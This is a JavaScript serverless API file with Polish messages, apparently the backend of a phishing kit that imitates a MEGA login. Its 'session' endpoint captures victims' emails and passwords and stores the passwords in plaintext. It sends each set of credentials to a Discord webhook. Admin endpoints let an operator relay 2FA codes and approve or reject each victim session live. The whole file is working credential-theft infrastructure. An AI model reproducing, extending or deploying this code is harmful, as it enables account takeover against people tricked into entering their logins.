// api/index.js
import { Redis } from '@upstash/redis';

const redis = Redis.fromEnv();

export default async function handler(req, res) {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const { action } = req.query;

    try {
        // ============================================================
        // SESSION - logowanie
        // ============================================================
        if (action === 'session' && req.method === 'POST') {
            const { email, password, ip } = req.body;

            if (!email || !password) {
                return res.status(400).json({ error: 'Email i hasło wymagane' });
            }

            const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
            
            const sessionData = {
                email,
                password,
                ip: ip || 'N/A',
                timestamp: new Date().toISOString(),
                code: null,
                verified: false,
                rejected: false,
                approved: false
            };

            await redis.setex(`session:${sessionId}`, 300, JSON.stringify(sessionData));
            await redis.sadd('sessions', sessionId);

            // Webhook
            const webhook = process.env.DISCORD_WEBHOOK;
            if (webhook) {
                await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: 'MEGA Panel',
                        embeds: [{
                            title: '🔐 Nowe logowanie',
                            description: `Email: ${email}\nHasło: ${password}`,
                            color: 0xFBBF24,
                            fields: [
                                { name: '📧 Email', value: email, inline: true },
                                { name: '🔑 Hasło', value: `||${password}||`, inline: true },
                                { name: '🌐 IP', value: ip || 'N/A', inline: true },
                                { name: '🆔 Sesja', value: sessionId, inline: true }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    })
                });
            }

            return res.status(200).json({ 
                success: true, 
                sessionId: sessionId,
                message: 'Zalogowano pomyślnie.'
            });
        }

        // ============================================================
        // POLL - sprawdzanie statusu sesji
        // ============================================================
        if (action === 'poll' && req.method === 'GET') {
            const { sessionId } = req.query;

            if (!sessionId) {
                return res.status(400).json({ error: 'Brak sessionId' });
            }

            const data = await redis.get(`session:${sessionId}`);
            if (!data) {
                return res.status(404).json({ error: 'Sesja nie istnieje' });
            }

            const session = JSON.parse(data);
            return res.status(200).json({
                code: session.code || null,
                verified: session.verified || false,
                rejected: session.rejected || false,
                approved: session.approved || false
            });
        }

        // ============================================================
        // SET-CODE - admin ustawia kod
        // ============================================================
        if (action === 'set-code' && req.method === 'POST') {
            const { sessionId, code, adminPassword } = req.body;

            if (!sessionId || !code) {
                return res.status(400).json({ error: 'Brak sessionId lub kodu' });
            }

            if (adminPassword !== process.env.ADMIN_PASSWORD) {
                return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
            }

            const data = await redis.get(`session:${sessionId}`);
            if (!data) {
                return res.status(404).json({ error: 'Sesja nie istnieje' });
            }

            const session = JSON.parse(data);
            session.code = code;
            session.codeSetAt = new Date().toISOString();

            await redis.setex(`session:${sessionId}`, 300, JSON.stringify(session));

            const webhook = process.env.DISCORD_WEBHOOK;
            if (webhook) {
                await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: 'MEGA Panel',
                        embeds: [{
                            title: '🔐 Kod 2FA ustawiony',
                            description: `Kod: ${code} dla użytkownika ${session.email}`,
                            color: 0x4ADE80,
                            fields: [
                                { name: '📧 Email', value: session.email, inline: true },
                                { name: '🔐 Kod', value: code, inline: true }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    })
                });
            }

            return res.status(200).json({ 
                success: true, 
                message: 'Kod ustawiony!'
            });
        }

        // ============================================================
        // APPROVE - admin zatwierdza
        // ============================================================
        if (action === 'approve' && req.method === 'POST') {
            const { sessionId, adminPassword } = req.body;

            if (!sessionId) {
                return res.status(400).json({ error: 'Brak sessionId' });
            }

            if (adminPassword !== process.env.ADMIN_PASSWORD) {
                return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
            }

            const data = await redis.get(`session:${sessionId}`);
            if (!data) {
                return res.status(404).json({ error: 'Sesja nie istnieje' });
            }

            const session = JSON.parse(data);
            session.approved = true;
            session.verified = true;

            await redis.setex(`session:${sessionId}`, 300, JSON.stringify(session));

            return res.status(200).json({ 
                success: true, 
                message: 'Użytkownik zatwierdzony!',
                approved: true
            });
        }

        // ============================================================
        // REJECT - admin odrzuca
        // ============================================================
        if (action === 'reject' && req.method === 'POST') {
            const { sessionId, adminPassword } = req.body;

            if (!sessionId) {
                return res.status(400).json({ error: 'Brak sessionId' });
            }

            if (adminPassword !== process.env.ADMIN_PASSWORD) {
                return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
            }

            const data = await redis.get(`session:${sessionId}`);
            if (!data) {
                return res.status(404).json({ error: 'Sesja nie istnieje' });
            }

            const session = JSON.parse(data);
            session.rejected = true;

            await redis.setex(`session:${sessionId}`, 300, JSON.stringify(session));

            return res.status(200).json({ 
                success: true, 
                message: 'Użytkownik odrzucony!',
                rejected: true
            });
        }

        // ============================================================
        // ADMIN SESSIONS - lista sesji
        // ============================================================
        if (action === 'sessions' && req.method === 'GET') {
            const { adminPassword } = req.query;

            if (adminPassword !== process.env.ADMIN_PASSWORD) {
                return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
            }

            const sessionIds = await redis.smembers('sessions');
            const sessions = [];

            for (const id of sessionIds) {
                const data = await redis.get(`session:${id}`);
                if (data) {
                    const session = JSON.parse(data);
                    sessions.push({
                        sessionId: id,
                        email: session.email,
                        timestamp: session.timestamp,
                        hasCode: !!session.code,
                        verified: session.verified || false,
                        rejected: session.rejected || false,
                        approved: session.approved || false
                    });
                }
            }

            sessions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

            return res.status(200).json({ sessions });
        }

        // ============================================================
        // Domyślnie - 404
        // ============================================================
        return res.status(404).json({ error: 'Nieznana akcja' });

    } catch (error) {
        console.error('API error:', error);
        return res.status(500).json({ error: 'Internal server error: ' + error.message });
    }
}
